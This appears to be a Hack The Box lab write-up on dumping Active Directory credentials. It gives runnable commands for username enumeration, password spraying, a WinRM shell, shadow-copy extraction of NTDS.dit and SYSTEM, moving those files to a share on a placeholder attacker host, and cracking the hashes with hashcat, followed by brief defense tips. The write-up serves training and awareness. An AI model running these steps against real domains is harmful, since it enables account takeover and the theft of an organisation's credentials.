# 🧪 Active Directory Credential Dumping Lab (NTDS.dit)

This lab demonstrates how adversaries can extract and crack credentials from a compromised Windows Active Directory environment using post-exploitation techniques. This simulation was performed in a controlled lab for educational and awareness purposes only.

---

## 🎯 Objective

* Enumerate users from public sources
* Attempt password spraying to gain access
* Dump `NTDS.dit` and `SYSTEM` hive from domain controller
* Crack NTLM hashes offline using `hashcat`

---

## 🧰 Tools Used

| Tool                   | Purpose                                   |
| ---------------------- | ----------------------------------------- |
| `username-anarchy`     | Generate likely usernames                 |
| `kerbrute`             | Username enumeration & password spray     |
| `evil-winrm`           | Remote PowerShell shell over WinRM        |
| `vssadmin`             | Create Volume Shadow Copy                 |
| `impacket-secretsdump` | Dump NT hashes from `NTDS.dit` + `SYSTEM` |
| `hashcat`              | Offline NTLM hash cracking                |
| `smbserver.py`         | Host SMB share to receive extracted files |

---

## 🧪 Lab Steps

### 1. Username Generation

```bash
cat << EOF > username.txt
John Marston
Carol Johnson
Jennifer Stapleton
EOF

./username-anarchy "Jennifer Stapleton" >> username.txt
```

### 2. Username Enumeration with Kerbrute

```bash
./kerbrute userenum -d ILF.local --dc <DC-IP> username.txt
```

### 3. Password Brute Force Attempt

```bash
./kerbrute bruteuser -d ILF.local --dc <DC-IP> /usr/share/wordlists/fasttrack.txt jstapleton
```

### 4. Gaining Remote Access (If Credentials Found)

```bash
evil-winrm -i <DC-IP> -u jmarston -p 'P@ssword!'
```

### 5. Shadow Copy & Extract NTDS.dit & SYSTEM

```powershell
vssadmin CREATE SHADOW /For=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit .
reg.exe save hklm\SYSTEM SYSTEM
```

### 6. Transfer Files to Attack Host

```powershell
move NTDS.dit \\<Attacker-IP>\NTDS
move SYSTEM \\<Attacker-IP>\NTDS
```

### 7. Start SMB Server (On Attacker)

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support NTDS /home/user/NTDS
```

### 8. Dump Hashes with Impacket

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

📦 **Sample (mocked) output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
```

### 9. Crack NTLM Hash with Hashcat

```bash
hashcat -m 1000 '92fd67fd2f49d0e83744aa82363f021b' /usr/share/wordlists/rockyou.txt
hashcat -m 1000 '92fd67fd2f49d0e83744aa82363f021b' --show
```

✅ **Cracked Password:** `Summer2024!`

---

## 🛡️ Defense Recommendations

* Enforce strong passwords and MFA
* Disable unnecessary WinRM access
* Monitor for brute force attempts (Event ID 4625/4771)
* Restrict access to `NTDS.dit` and disable unnecessary Volume Shadow Copy usage

---

> ⚠️ **Note:** All testing was conducted ethically in a lab environment (Hack The Box) for training purposes.

---

## 🔗 Related

* [Kerbrute](https://github.com/ropnop/kerbrute)
* [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)
* [Impacket](https://github.com/fortra/impacket)
* [Hashcat](https://hashcat.net/hashcat/)

